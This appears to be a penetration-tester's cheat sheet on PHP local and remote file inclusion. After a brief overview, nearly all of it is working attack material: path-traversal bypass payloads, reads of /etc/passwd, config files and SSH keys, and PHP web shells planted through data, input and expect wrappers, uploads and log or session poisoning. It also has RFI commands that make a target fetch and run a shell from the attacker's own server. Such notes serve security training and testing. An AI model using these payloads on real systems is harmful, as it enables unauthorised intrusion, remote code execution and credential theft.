### Content
* [Overview](#overview)
* [Local file inclusion](#local-file-inclusion) (LFI)
* [Bypasses Techniques](#bypasses-techniques)
	* Non-Recursive Path Traversal Filters
	* Encoding
	* Approved Paths
	* Appended Extension
	* Filename Prefix
* [PHP Filters](#php-filters)
	* [Scenarios](#scenarios)
		* Reading PHP files with convert filter
* [From LCI to RCE](#from-lci-to-rce)
	* [PHP wrappers](#php-wrappers)
		* Data / Input / Expect
	* [Remote File Inclusion](#remote-file-inclusion) (RFI)
		* Python / FTP / SMB
	* [File Uploads](#file-uploads)
		* GIF Image Upload
		* ZIP Upload
		* Phar Upload
	* [Log Poisoning](#log-poisoning)
		* [PHP Session Poisoning](#php-session-poisoning)
		* [Server Log Poisoning](#server-log-poisoning)
* [Read, Write and Execute Functions](#read-write-and-execute-functions)

> [!Important]
> [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

---
## Overview
- **Types of File Inclusion**:
    - **Local File Inclusion (LFI)**: An attacker includes files from the local file system by manipulating paths.
    - **Remote File Inclusion (RFI)**: An attacker includes files from an external server by supplying a remote URL.
- **Cause**: File inclusion vulnerabilities occur when an application dynamically loads files based on user input without properly validating or sanitizing the file paths. If user input is passed directly to a function that includes files (e.g., `include` in PHP), attackers can control which files are included.
- **Exploitation**:
    - **LFI**: Attackers can manipulate file paths (e.g., using `../../etc/passwd`) to access sensitive system files. If the application is vulnerable to LFI, attackers may also try to execute code by including files that they upload or injecting code into log files that can be loaded.
    - **RFI**: By supplying a URL as the file path, attackers can make the server download and execute files from an external source, allowing remote code execution. RFI is often restricted in modern environments, but it remains a risk if URL-based includes are allowed.
- **Impact**:
    - Sensitive Data Disclosure
    - Remote Code Execution (RCE)
    - Privilege Escalation
- **Prevention**:
    - **Input Validation**: Strictly validate and sanitize file paths. Allow only predefined file paths or filenames, and avoid processing user input directly.
    - **Disable URL Includes**: Ensure that `allow_url_include` (for PHP) or similar settings are disabled to prevent RFI.
    - **Use Absolute Paths**: Instead of allowing user-defined paths, use predefined, absolute paths within the application’s scope.
---
## Local file inclusion
If we were not sure of the directory the web application is in, we can add `../` many times.
- **Common readable files** that are available on most back-end servers:
	- `Windows`: `C:\Windows\boot.ini`
	- `Linux`: `/etc/passwd`
- The main directory of web applications on Linux servers is `/var/www/html/`.
- **Second-Order Attacks**
	- If a web application allow the user to download his avatar through `/profile/$username/avatar.png`, If we crafted a malicious username `../../../etc/passwd`.
	- If the web application didn't sanitize or filter our username, It will be possible to pull another local file from the system rather the user avatar.
---
> [!TIP]
> Don't forget to try to combine many techniques together because Some web applications may apply many filters together. 
## Bypasses Techniques
- **Non-Recursive Path Traversal Filters**
	- If the `../` substring is being replaced from user input.
		- payloads: `....//` , `..././` , `....\/` , `....////`
- **Encoding**
	- If the target didn't allow `.` and `/` characters as input
		- It's a must  to URL encode all characters, including the dots. `../etc/passwd`: `%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
		- Try to encode the encoded string once again to have a `double encoded` string, which may also bypass other types of filters.
- **Approved Paths**
	- Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path.
		1. Fuzz web directories under the same path until we an approved path.
		2. Start our payload with the approved path, then use `../` to go back to the root.
- **Appended Extension**
	- If the web applications append an extension to our input string (e.g. `.php`).
	- Cannot be bypassed on modern versions of PHP but can be useful to read the source code.
	- Techniques that only works with `PHP versions before 5.3/5.4`:
		1. **Path Truncation**
			- Earlier versions of PHP has a limit of 4096 characters, If a longer string passed, it will be truncated.
			- PHP removes the trailing `/.` : `/etc/passwd/.` -> `/etc/passwd`
			- PHP and Linux disregard multiple `/` : `////etc/passwd` -> `/etc/passwd`
			- Also disregard the current directory shortcut `.` : `/etc/./passwd` -> `/etc/passwd`
			- We have to `start the path with a non-existing directory` for this technique to work.
				``` bash
				echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
				```
		2. **Null Bytes**
			- PHP versions before 5.5 were vulnerable to `null byte injection`, `%00` terminate strings.
			- Sending `/etc/passwd%00` would be `/etc/passwd%00.php` but the path used would actually be `/etc/passwd`
- **Filename Prefix**
	- If the web app takes an input `file` and appends `lang_` to it, resulting in `lang_../../../etc/passwd` which will be invalid path.
		- Add `/` at the beginning of the path, `lang_/../../../etc/passwd`, the leading `/` might reset the path to root.
---
## PHP Filters
- [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams.
- 4 types of filters: [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php).
- Main parameters for filter wrapper are `resource` and `read`.
	- `resource` To specify the stream we would like to apply our filter on (e.g. local file).
	- `read` To apply different filters on the input resource.
	- The important filter for FI is `convert.base64-encode` filter, under [Conversion Filters](https://www.php.net/manual/en/filters.convert.php).
###  Scenarios
- **If we have a LFI and the site using appended extension to the user input and we want to read the local PHP files**:
	1. Fuzzing to find PHP files.
	   We are not restricted to pages with HTTP response code `200`, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.
		``` bash
		ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
		configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
		```
	2.  We should use the payload `configure`: `www.example.com/index.php?lang=configure`
		1. If the web app uses a [Read, Write and Execute Functions](#read-write-and-execute-functions) that executes the content of the file, it won't show the file content.
		2. Using PHP wrapper with convert filter to encode the content of the file so it doesn't get executed
		   `www.example.com/index.php?lang=php://filter/read=convert.base64-encode/resource=config`
		3. Decode the output
			``` bash
			echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
			```
---
## From LCI to RCE
> [!Note]
> - `/etc/php/X.Y/apache2/php.ini` for Apache (`X.Y` is the PHP version installed).
> - `/etc/php/X.Y/fpm/php.ini` for Nginx.
> - Search for DB password in `config.php` and check for password reuse.
> - Check `.ssh` directory on each user home directory for their private keys `id_rsa`.
### PHP wrappers:
- [Data](https://www.php.net/manual/en/wrappers.data.php)
	- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
		``` bash
		curl "http://URL/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
		# Then decode the output
		echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
		```
	- Encode our payload then send it with data wrapper `data://text/plain;base64`
		``` bash
		$ echo '<?php system($_GET["cmd"]); ?>' | base64
		PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
		$ curl -s 'http://URL/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep id
		```
- [Input](https://www.php.net/manual/en/wrappers.php.php)
	- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
	- Send the payload as a POST parameter, so the vulnerable parameter must accept POST request.
		``` bash
		curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://URL/index.php?language=php://input&cmd=id"
		# If the vulnerable function doesn't accept GET parameters, hardcode the command directly in the payload
		curl -s -X POST --data '<?php system("id"); ?>' "http://URL/index.php?language=php://input"
		```
- [Expect](https://www.php.net/manual/en/wrappers.expect.php)
	- Expect wrapper is an external wrapper so it has to be installed and enabled manually.
	- Check PHP configurations like above but `grep expect`, we would get `extension=expect` as result if it's there.
	- Use expect module to gain RCE
		``` bash
		curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
		```
### Remote File Inclusion:
- Any RFI vulnerability is also an LFI vulnerability, but an LFI may not necessarily be an RFI. Check [Read, Write and Execute Functions](#read-write-and-execute-functions)
- How to verify a RFI:
	- If the server is running PHP in the back-end ?
		- Check `allow_url_include` setting on `php.ini`, (not reliable cause the vulnerable function may not allow remote URLS)
		- Try to include a local URL `http://127.0.0.1:80/index.php` to see firewall reaction.
			- Don't include the vulnerable page as this can cause recursive inclusion loop which may lead to DoS on the server.
- **Remote Code Execution with RFI**
	- Create a malicious script:
		``` bash
		echo '<?php system($_GET["cmd"]); ?>' > shell.php
		```
	- Host the malicious script and use common HTTP ports to avoid detection then visit the infected page:
		- Python
			``` bash
			sudo python3 -m http.server <LISTENING_PORT>
			# Visit the URL on the browser:
			curl "http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id"
			```
		- FTP
			``` bash
			sudo python -m pyftpdlib -p 21
			# Visit the URL on the browser (If the server uses anonymous creds):
			curl "http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id"
			# If the server requires creds:
			curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
			```
		- SMB (If the vulnerable web application is hosted on a Windows server)
			``` bash
			impacket-smbserver -smb2support share $(pwd)
			# Visist the URL on the browser:
			curl "http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami"
			```
### File Uploads
- GIF Image Upload
	- Craft the malicious Image and upload it.
		``` bash
		echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
		```
	- We can find the file path through the HTML code of the site or through the URL 
		``` HTML
		<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
		```
	- Include the uploaded file in the LFI vulnerable function
		``` bash
		curl "http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id"
		```
- Zip Upload (zlib:// bzip2:// zip:// wrappers to execute PHP code. This wrapper isn't enabled by default) 
	- Craft the malicious ZIP and upload it.
		``` bash
		echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
		```
	- Include the uploaded file in the LFI vulnerable function
		``` bash
		curl "http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"
		```
- Phar Upload
	- Create `shell.php`
		``` PHP
		<?php
		$phar = new Phar('shell.phar');
		$phar->startBuffering();
		$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
		$phar->setStub('<?php __HALT_COMPILER(); ?>');
		
		$phar->stopBuffering();
		```
	- compile it into a `phar` file and rename it to `shell.jpg` and upload it.
		``` bash
		php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
		```
	- Include the uploaded file in the LFI vulnerable function
		``` bash
		curl "http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id"
		```
### Log Poisoning
Writing PHP code in a field we control that gets logged into a log file, and then include that log file to execute the PHP code.
For this attack to work, We should have read privileges over the logged files and the vulnerable function has execute privileges.
#### PHP Session Poisoning
- Most PHP web apps utilize `PHPSESSID` cookies to save user data on the back-end
	- `/var/lib/php/sessions/sess_<PHPSESSID_cookie_value>`  on Linux
	- `C:\Windows\Temp\sessions\sess_<PHPSESSID_cookie_value>` on Windows

**Scenario** If we have an infected web application with LFI on the language parameter:
1. Include the session file through the LFI vulnerability and view its contents:
	``` bash
	$ curl "http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd"
	[SNIP]......page|s:6:"en.php";preference|s:7:"English";.......
	# page value is under our control, as we can control it through the ?language= parameter.
	```
2. Manipulate the controllable parameter to become a PHP web shell.
	``` bash
	$ curl "http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"
	```
3. Include the session file and use the `&cmd=id` to execute a commands
	``` bash
	$ curl "http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id"
	......page|s:30:"uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)";preference|s:7:"Spanish";.....[SNIP]
	```

> [!Note] To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten after every inclusion.
#### Server Log Poisoning
- `access.log` and `error.log`.
	- `Nginx` readable by low privileged users by default. 
		- `/var/log/nginx/` on Linux.
		- `C:\nginx\log\` on Windows.
	- `Apache` readable by users with high privileges, **Older and misconfigured are not**.
		- `/var/log/apache2/` on Linux.
		- `C:\xampp\apache\logs\` on Windows.
- If they are in different location, we may use [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.
> Poisoning `User-Agent` header on http requests.
- `User-Agent` header can be controlled by editing requests.
	- Shown on:
		- `access.log`
		- `/proc/self/environ`
		- `/proc/self/fd/N` files (where N is a PID usually between 0-50)
	- If we can include a file from the 3 above, Poison the `User-Agent` header then include the readable: 
		``` bash
		curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
		curl "http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log?cmd=id" | grep uid
		[SNIP]..."uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)"
		```
- If we have read permissions to read various system services logs with LFI such `ssh`, `ftp`, `mail services`:
	- Try log into them and set the username to PHP code, and upon including their logs, the PHP code would execute.
		- `/var/log/sshd.log` 
		- `/var/log/vsftpd.log`
	- We can send an email containing PHP code, and upon its log inclusion, the PHP code would execute.
		- `/var/log/mail`
---
## Read, Write and Execute Functions

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()` Express.js    |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |

#### Examples 
If the web application takes a `GET` parameter `?language=en` as input without sanitization or filtration :
- PHP, we may use these functions to load a local or a remote file as we load a page:
	``` PHP
	if (isset($_GET['language'])) { include($_GET['language']); }
	```
- NodeJS
	``` JS
	// NodeJS
	if(req.query.language) {
		fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
			res.write(data);
		});
	}
	// Express.js
	app.get("/about/:language", function(req, res) {
		res.render(`/${req.params.language}/about.html`);
	});
	```
- Java: `Java Server Pages (JSP)`
	``` java
	// Include local files based on the specified parameter
	<c:if test="${not empty param.language}">
		<jsp:include file="<%= request.getParameter('language') %>" />
	</c:if>
	// The `import` function may also be used to render a local file or a URL
	<c:import url= "<%= request.getParameter('language') %>"/>
	```
- .NET
	``` CS
	// Takes a file path for its input and writes its content to the response
	@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
		<% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> }
	// Render the specified file as part of the front-end template
	@Html.Partial(HttpContext.Request.Query['language'])
	// Render local files or remote URLs
	<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
	```
---